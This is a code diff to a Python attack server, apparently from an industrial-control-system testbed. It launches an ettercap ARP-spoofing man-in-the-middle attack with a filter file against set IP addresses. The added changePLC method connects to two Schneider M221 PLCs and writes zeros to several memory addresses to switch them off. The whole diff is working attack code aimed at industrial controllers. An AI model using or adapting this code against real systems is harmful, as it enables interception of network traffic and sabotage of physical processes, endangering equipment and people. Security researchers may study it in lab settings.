@@ -15,6 +15,8 @@ import sys
 import signal
 import socket
 import subprocess
+import M2PLC221 as m221
+import time
 
 
 
@@ -54,12 +56,27 @@ class attackServ(object):
                 atkStr = "sudo ettercap -T -q -F /home/pi/mitm/_1.ef -M ARP /172.18.212.120,123//"
                 p = subprocess.Popen(atkStr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                 print(p)
+                time.sleep(1)
+                self.changePLC()
+
             else:
                 print('Stop the attack.')
                 for line in os.popen("ps ax | grep ettercap | grep -v grep"):
                     fields = line.split()
                     pid = fields[0]
                     os.kill(int(pid), signal.SIGKILL)
+
+    def changePLC(self):
+        print("Off all the m221 plc")
+        memList = ('M0', 'M10', 'M20','M60')
+        plc1 = m221.M221('192.168.10.72')
+        plc2 = m221.M221('192.168.10.73')
+        for memAddr in memList:
+            plc1.writeMem(memAddr, 0)
+            plc2.writeMem(memAddr, 0)
+
+        plc1.disconnect()
+        plc2.disconnect()
 
 #-----------------------------------------------------------------------------
 def serverRun():
